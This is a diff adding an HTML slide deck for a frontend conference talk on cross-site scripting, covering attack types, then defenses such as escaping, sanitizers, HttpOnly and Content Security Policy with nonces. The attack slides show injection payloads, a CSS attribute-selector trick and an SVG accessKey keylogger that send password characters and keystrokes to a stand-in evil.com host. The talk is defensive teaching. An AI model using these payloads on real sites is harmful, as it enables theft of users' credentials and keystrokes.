@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>XSS Wars. The Force Awakens</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<link rel="stylesheet" href="styles/screen.css">	
+	<style type="text/css">
+		.pad {
+			padding-left: 50px;
+		}
+	</style>
+</head>
+<body class="list">
+	<header class="caption">
+		<h1>XSS Wars. The Force Awakens</h1>
+		<p>Dashukevich Vladimir</p>
+	</header>
+	<section class="slide cover" id="face"><div>
+		<div style="color: #fff; font-size: 1.5em;">
+			<div>{</div>
+			<div class="pad">Theme: <mark>XSS Wars. The Force Awakens</mark>,</div>
+			<div class="pad">Speaker: <mark>Dashukevich Vladimir</mark>,</div>
+			<div class="pad">Company: <mark>XBSoftware</mark>,</div>
+			<div class="pad">Comunity: <mark>4frontby</mark>,</div>
+			<div class="pad">Conference: <mark>Frontend Union Conf</mark></div>
+			<div>}</div>
+		</div>
+		<img src="pictures/53.png" alt="">
+	</section>
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/22.jpg">
+		</div>
+	</section>
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/42.png">
+		</div>
+	</section>
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/4front.png">
+		</div>
+	</section>
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/41.png">
+		</div>
+	</section>
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/webix.jpg">
+		</div>
+	</section>
+	<section class="slide">
+		<div>
+			<h2>Plan:</h2>
+			<ol>
+				<li class="next">What does XSS mean?</li>
+				<li class="next">How does it look like?</li>
+				<li class="next">How can you protect yourself?</li>
+				<li class="next">How can we find a "hole"?</li>
+				<li class="next">Why do we need it?</li>
+			</ol>
+		</div>
+	</section>
+	<section class="slide shout"><div>
+		<h2>What does XSS mean?</h2>
+	</section>
+	<section class="slide shout"><div>
+		<h2>Cross Site Scripting</h2>
+	</section>
+	<section class="slide"><div>
+		<h2 style="margin-top: 60px;">XSS attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites</h2>
+		<div style="float:right; font-size: 40px;">The Open Web Application Security Project</div>
+	</section>
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/50.jpg">
+		</div>
+	</section>
+	<section class="slide"><div>
+		<h2 style="margin-top: 80px;">XSS attack is, when someone runs its sh**ty code inside our perfect Web Apps</h2>
+		<div style="float:right; font-size: 35px;">Vladimir Dashukevich</div>
+	</section>
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/1.jpg">
+		</div>
+	</section>
+	<section class="slide shout"><div>
+		<h2>How does it look like?</h2>
+	</section>
+	<section class="slide"> 
+		<div>
+			<h2 class="next" style="text-align: center; font-size: 3.5em;">Stored (Persistent)</h2>
+			<h2 class="next" style="text-align: center; font-size: 3.5em; margin-top: 150px;">Reflected</h2>
+		</div>
+	</section>
+	<section class="slide shout"><div>
+		<h2>Stored XSS attacks</h2>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/47.jpg">
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/45.png">
+		</div>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/45.jpg">
+		</div>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/49.jpg">
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/46.png">
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Reflected XSS attacks</h2>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/17.gif">
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/47.jpg">
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/45.png">
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/30.jpg">
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>How can it be dangerous?</h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Just make an user to send the same request</h2>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/48.png">
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/46.png">
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>POST or GET</h2>
+	</section>
+
+	<section class="slide"><div>
+		<h2 style="line-height: 1.2em; margin-top: 100px;">https://you.site?param1=some_value&<br><mark>run=&lt;script&gt;alert(1)&lt;/script&gt;</mark></h2>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/45.png">
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>How can it be dangerous?</h2>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>XSS effects</h2>
+			<ol>
+				<li class="next">document.cookie</li>
+				<li class="next">window.localStorage</li>
+				<li class="next">Silent spy (keylogger)</li>
+				<li class="next">Redirects</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>How to make a user run a script</h2>
+	</section>
+
+	<section class="slide"><div>
+		<h2>Simple template</h2>
+		<div>
+			<pre>
+				<code>&lt;div style='{{css}}'&gt;</code>
+				<code>    &lt;input value='{{value}}'&gt;</code>
+				<code>    Hello, {{title}}</code>
+				<code>    {{image}}</code>
+				<code>&lt;/div&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<h2>Simple template</h2>
+		<div>
+			<pre>
+				<code>&lt;div style='{{css}}'&gt;</code>
+				<code>    &lt;input value='<mark class='important'>{{value}}</mark>'&gt;</code>
+				<code>    Hello, {{title}}</code>
+				<code>    {{image}}</code>
+				<code>&lt;/div&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+
+	<section class="slide"><div>
+		<h2>Simple template</h2>
+		<div>
+			<pre>
+				<code>&lt;div style='{{css}}'&gt;</code>
+				<code>    &lt;input value='<mark class='important'>' onmouseover='alert(1)</mark>'&gt;</code>
+				<code>    Hello, {{title}}</code>
+				<code>    {{image}}</code>
+				<code>&lt;/div&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Done! Simple)))</h2>
+	</section>
+
+	<section class="slide"><div>
+		<h2>Simple template</h2>
+		<div>
+			<pre>
+				<code>&lt;div style='{{css}}'&gt;</code>
+				<code>    &lt;input value='{{value}}'&gt;</code>
+				<code>    Hello, <mark class='important'>{{title}}</mark></code>
+				<code>    {{image}}</code>
+				<code>&lt;/div&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<h2>Simple template</h2>
+		<div>
+			<pre>
+				<code>&lt;div style='{{css}}'&gt;</code>
+				<code>    &lt;input value='{{value}}'&gt;</code>
+				<code>    Hello, <mark class='important'>&lt;img src='a.png' onerror='alert(1)'&gt;</mark></code>
+				<code>    {{image}}</code>
+				<code>&lt;/div&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Why always me?))</h2>
+	</section>
+
+	<section class="slide"><div>
+		<h2>Simple template</h2>
+		<div>
+			<pre>
+				<code>&lt;div style='<mark class='important'>{{css}}</mark>'&gt;</code>
+				<code>    &lt;input value='{{value}}'&gt;</code>
+				<code>    Hello, {{title}}</code>
+				<code>    {{image}}</code>
+				<code>&lt;/div&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>His CSS to help you with UX))</h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2><a href="https://github.com/tlrobinson/evil.css/">evil.css</a></h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Can I steel something?</h2>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code style="margin-top: 150px;">&lt;input type='password' id='hi' value='<mark class="important">abcd</mark>'&gt;</code>
+			</pre>
+		</div>
+	</section>
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>#hi[value^="a"] {</code>
+				<code>   background-color: url(//evil.com/?v=a);</code>
+				<code>}</code>
+				<code>#hi[value^="b"] {</code>
+				<code>   background-color: url(//evil.com/?v=b);</code>
+				<code>}</code>
+			</pre>
+		</div>
+	</section>
+	<section class="slide shout">
+		<div>
+			<h2><a href='http://eaea.sirdarckcat.net/cssar/v2/'>example</a></h2>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Or even worse?</h2>
+	</section>
+
+	<section class="slide"><div>
+		<h2>Simple template</h2>
+		<div>
+			<pre>
+				<code>&lt;div style='{{css}}'&gt;</code>
+				<code>    &lt;input value='{{value}}'&gt;</code>
+				<code>    Hello, {{title}}</code>
+				<code>    <mark class='important'>{{image}}</mark></code>
+				<code>&lt;/div&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Keylogger with image</h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>&lt;set&gt; in &lt;svg&gt;</h2>
+	</section>
+
+	<section class="slide"><div>
+		<h2>SVG image</h2>
+		<div>
+			<pre>
+				<code>&lt;defs&gt;</code>
+				<code>    &lt;path id='example' d="..."&gt;</code>
+				<code>&lt;/defs&gt;</code>
+				<code>&lt;use xlink:href="#example" visibility="hidden"&gt;</code>
+				<code>	  &lt;set begin="0s" end="1s" </code>
+				<code>	      attributeName="visibility" to="visible"&gt;</code>
+				<code>&lt;/use&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<h2>SVG image</h2>
+		<div>
+			<pre>
+				<code>&lt;defs&gt;</code>
+				<code>    &lt;path id='example' d="..."&gt;</code>
+				<code>&lt;/defs&gt;</code>
+				<code>&lt;use xlink:href="#example" visibility="hidden"&gt;</code>
+				<code>	  &lt;set begin="<mark class='important'>accessKey(a)</mark>" </code>
+				<code>	      attributeName="<mark class='important'>xlink:href</mark>" to="<mark class='important'>//evil.com/?a</mark>"&gt;</code>
+				
+				<code>&lt;/use&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<h2>SVG image</h2>
+		<div>
+			<pre>
+				<code>&lt;set begin="accessKey(a)" attributeName="xlink:href"</code>
+				<code>        to="//evil.com/?a"&gt;</code>
+				<code>&lt;set begin="accessKey(b)" attributeName="xlink:href"</code>
+				<code>        to="//evil.com/?b"&gt;</code>
+				<code>...</code>
+				<code>&lt;set begin="accessKey(x)" attributeName="xlink:href"</code>
+				<code>        to="//evil.com/?x"&gt;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2><a href="https://html5sec.org/keylogger/">example</a></h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Scary?</h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>What is a browser?</h2>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/5.jpg">
+		</div>
+	</section>
+	<section class="slide">
+		<div>
+			<h2>What is outside the browser?</h2>
+			<ol>
+				<li class="next">Adware</li>
+				<li class="next">Adblock</li>
+				<li class="next">Beeline (Билайн)</li>
+				<li class="next">Other evil extensions...</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Why are they bad?</h2>
+			<ol>
+				<li class="next">Can change a lot of things</li>
+				<li class="next">Run any code</li>
+				<li class="next">Inject scripts</li>
+				<li class="next">Steel something</li>
+			</ol>
+		</div>
+	</section>
+	
+	<section class="slide shout">
+		<h2>Why are they good?</h2>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/51.jpg">
+		</div>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/2.gif">
+		</div>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/2.jpg">
+		</div>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/http2.gif">
+		</div>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Summary</h2>
+			<ol>
+				<li class="next">XSS attacks: stored and reflected</li>
+				<li class="next">All private data can be stolen with XSS</li>
+				<li class="next">Beware of ... <span class="next">well, just beware everything</span></li>
+				<li class="next">Images, scripts, css, extensions</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>How can you protect yourself?</h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Avoid adding HTML as a string</h2>
+	</section>
+	<section class="slide"><div>
+		<div>
+			<h2>Dangerous code</h2>
+			<ol>
+				<li class="next">innerHTML</li>
+				<li class="next">insertAdjacentHTML</li>
+			</ol>
+			<h2 class="next">Safe code</h2>
+			<ol>
+				<li class="next">textContent</li>
+				<li class="next">createTextNode (appendChild, insertBefore)</li>
+				<li class="next">innerText</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<h2>Dangerous code</h2>
+			<ol>
+				<li class="next">eval</li>
+				<li class="next">new Function</li>
+			</ol>
+			<h2 class="next">Solutions</h2>
+			<ol>
+				<li class="next">Write good code without eval</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Escaping everything</h2>
+	</section>
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>str.replace(/&amp;/g, '&amp;amp;')</code>
+				<code>   .replace(/"/g, '&amp;quot;')</code>
+				<code>   .replace(/'/g, '&amp;#39;')</code>
+				<code>   .replace(/&lt;/g, '&amp;lt;')</code>
+				<code>   .replace(/&gt;/g, '&amp;gt;');</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<h2>Sanitizer</h2>
+			<ol>
+				<li class="next"><a href="https://www.npmjs.com/package/sanitize-html">sanitize-html</a></li>
+				<li class="next"><a href="https://code.google.com/p/google-caja/wiki/JsHtmlSanitizer">JsHtmlSanitizer</a></li>
+				<li class="next"><a href="http://htmlpurifier.org/">htmlpurifier</a></li>
+				<li class="next">so on...</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Some HTTP headers</h2>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Headers</h2>
+			<ol>
+				<li class="next">X-XSS-Protection: 1</li>
+				<li class="next">HttpOnly</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>HttpOnly provides you with:</h2>
+			<ol>
+				<li class="next">HttpOnly restricts all access to document.cookie</li>
+				<li class="next">HttpOnly removes cookie information from the response headers in XMLHttpObject.getAllResponseHeaders()</li>
+				<li class="next">XMLHttpObjects may only be submitted to the same domain</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>What about iframes?</h2>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Solutions</h2>
+			<ol>
+				<li class="next">X-Frame-Options</li>
+				<li class="next">&lt;iframe <mark>sandbox</mark>&gt;&lt;/iframe&gt;</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/52.png">
+		</div>
+	</section>
+	
+	<section class="slide shout"><div>
+		<h2>Content Security Policy</h2>
+	</section>
+	<section class="slide">
+		<div>
+			<h2>History</h2>
+			<ol>
+				<li class="next">Mozilla came with idea in 2011</li>
+				<li class="next">Firefox 4 has CSP</li>
+				<li class="next">In 2012 it became a standart W3C</li>
+			</ol>
+		</div>
+	</section>
+	<section class="slide shout"><div>
+		<h2>HTTP header again</h2>
+	</section>
+	<section class="slide">
+		<div>
+			<h2>Headers</h2>
+			<ul>
+				<li class="next">Content-Security-Policy: [policy]</li>
+				<li class="next">Content-Security-Policy-Report-Only: [policy]</li>
+			</ul>
+		</div>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Policies</h2>
+			<ul>
+				<li>connect-src (XHR, WebSockets, EventSource, sendBeacon)</li>
+				<li>font-src</li>
+				<li>frame-src</li>
+				<li>img-src</li>
+				<li>media-src</li>
+				<li>script-src</li>
+				<li>style-src</li>
+				<li>object-src</li>
+			</ul>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code><mark>Content-Security-Policy:</mark></code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' 'unsafe-inline' 'unsafe-eval';</code>
+				<code>   report-uri https://mysite.com/report;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   <mark>default-src 'none';</mark></code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' 'unsafe-inline' 'unsafe-eval';</code>
+				<code>   report-uri https://mysite.com/report;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   <mark>frame-src mysite.com;</mark></code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' 'unsafe-inline' 'unsafe-eval';</code>
+				<code>   report-uri https://mysite.com/report;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   <mark>img-src 'self' *.google.com;</mark></code>
+				<code>   script-src 'self' 'unsafe-inline' 'unsafe-eval';</code>
+				<code>   report-uri https://mysite.com/report;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   <mark>script-src 'self' 'unsafe-inline' 'unsafe-eval';</mark></code>
+				<code>   report-uri https://mysite.com/report;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' 'unsafe-inline' 'unsafe-eval';</code>
+				<code>   <mark>report-uri /report?report=true;</mark></code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>How it works?</h2>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;script src="//evel.com/steel.js"&gt;&lt;/script&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' https://mysite.com;</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;script src="//evel.com/steel.js"&gt;&lt;/script&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   <mark class="important">script-src 'self' https://script.com;</mark></code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>{</code>
+				<code>   "csp-report": {</code>
+				<code>      "document-uri": "https://mysite.com/cats",</code>
+				<code>      "referrer": "https://evel.com",</code>
+				<code>      "blocked-uri": "https://evil.com/steel.js" ,</code>
+				<code>      "violated-directive": "script-src 'self' https://script.com;",</code>
+				<code>      "original-policy": ** all policy **</code>
+				<code>   }</code>
+				<code>}</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;img src="https://my.google.com/cat.png"&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' https://mysite.com;</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;img src="https://my.google.com/cat.png"&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   <mark class="important" style="background-color: #5cb85c;">img-src 'self' *.google.com;</mark></code>
+				<code>   script-src 'self' https://mysite.com;</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>https://mysite.com/fontello.woff</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   default-src 'none';</code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' https://mysite.com;</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>https://mysite.com/fontello.woff</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   <mark class="important">default-src 'none';</mark></code>
+				<code>   frame-src mysite.com;</code>
+				<code>   img-src 'self' *.google.com;</code>
+				<code>   script-src 'self' https://mysite.com;</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/38.png">
+		</div>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/17.jpg">
+		</div>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Can something be better?</h2>
+	</section>
+
+	<section class="slide shout"><div>
+		<h2>Content Security Policy v2</h2>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Features</h2>
+			<ol>
+				<li class="next">More directives: plugin-types, form-actions ... </li>
+				<li class="next">&lt;meta&gt; tags</li>
+				<li class="next">JS events (SecurityPolicyViolationEvent)</li>
+				<li class="next">Works with WebWorkers and fetch</li>
+				<li class="next">Signing scripts and css with <mark>nonce</mark></li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>'Sign' safe script</h2>
+			<ol>
+				<li class="next">script-src 'self' <mark>'nonce-$RANDOM'</mark></li>
+				<li class="next">&lt;script <mark>nonce="$RANDOM"</mark>&gt;</li>
+				<li class="next">Enjoy the result</li>
+			</ol>
+		</div>
+	</section>
+
+  <section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;script&gt;</code>
+				<code>   alert("Hello world")</code>
+				<code>&lt;/script&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   script-src 'self' 'nonce-Nc3n83cnSAd3wc3Sasdfn939hc3';</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;script&gt;</code>
+				<code>   alert("Hello world")</code>
+				<code>&lt;/script&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   script-src 'self' <mark class="important">'nonce-Nc3n83cnSAd3wc3Sasdfn939hc3'</mark>;</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;script nonce="Nc3n83cnSAd3wc3Sasdfn939hc3"&gt;</code>
+				<code>   alert("Hello world")</code>
+				<code>&lt;/script&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   script-src 'self' 'nonce-Nc3n83cnSAd3wc3Sasdfn939hc3';</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide"><div>
+		<div>
+			<pre>
+				<code>&lt;script <mark class="important" style="background-color: #5cb85c;">nonce="Nc3n83cnSAd3wc3Sasdfn939hc3"</mark>&gt;</code>
+				<code>   alert("Hello world")</code>
+				<code>&lt;/script&gt;</code>
+			</pre>
+		</div>
+		<div>
+			<pre>
+				<code>Content-Security-Policy:</code>
+				<code>   script-src 'self' <mark class="important" style="background-color: #5cb85c;">'nonce-Nc3n83cnSAd3wc3Sasdfn939hc3'</mark>;</code>
+				<code>   report-uri /report?report=true;</code>
+			</pre>
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/39.png">
+		</div>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Summary</h2>
+			<ol>
+				<li class="next">Believe nobody and escape everything</li>
+				<li class="next">Add HttpOnly, X-XSS-Protection headers to your responses</li>
+				<li class="next">CSP isn't 100% protection, but at least something</li>
+				<li class="next">Try CSP now</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide shout">
+		<div>
+			<h2>How to catch XSS</h2>
+		</div>
+	</section>
+	<section class="slide">
+		<div>
+			<h2>Examples</h2>
+			<ol>
+				<li class="next">xss.io (bookmarklet)</li>
+				<li class="next">skipfish</li>
+				<li class="next">WebCrawler</li>
+				<li class="next">Gremlins.js</li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide cover w"><div>
+		<div>
+			<img src="pictures/54.png">
+		</div>
+	</section>
+
+	<section class="slide shout">
+		<div>
+			<h2>And one more thing...</h2>
+		</div>
+	</section>
+
+	<section class="slide shout">
+		<div>
+			<h2>The trust of your customers is priceless</h2>
+		</div>
+	</section>
+
+	<section class="slide shout">
+		<div>
+			<h2>I want to give you my private date</h2>
+		</div>
+	</section>
+
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/52.jpg">
+		</div>
+	</section>
+
+	<section class="slide">
+		<div>
+			<h2>Links</h2>
+			<ol>
+				<li><a href="https://www.owasp.org/index.php/List_of_useful_HTTP_headers">HTTP headers</a></li>
+				<li><a href="https://www.youtube.com/watch?v=eb3suf4REyI">XSS through CSS (video)</a></li>
+				<li><a href="http://excess-xss.com/">Types of XSS</a></li>
+				<li><a href="https://google-gruyere.appspot.com/part2">Other examples of XSS</a></li>
+				<li><a href="https://xakep.ru/2013/12/23/61798/">Other examples 2 (ru)</a></li>
+			</ol>
+		</div>
+	</section>
+
+	<section class="slide shout">
+		<div>
+			<h2>Questions</h2>
+			<div>Facebook: <a href="https://www.facebook.com/dashukevich.vova">dashukevich.vova</a></div>
+			<div>Twitter: <a href="https://twitter.com/life__777">life__777</a></div>
+		</div>
+	</section>
+	<section class="slide cover h"><div>
+		<div>
+			<img src="pictures/16.gif">
+		</div>
+	</section>
+</body>
+<script src="js/shower.min.js"></script>
+<script type="text/javascript">
+
+</script>
+</html>
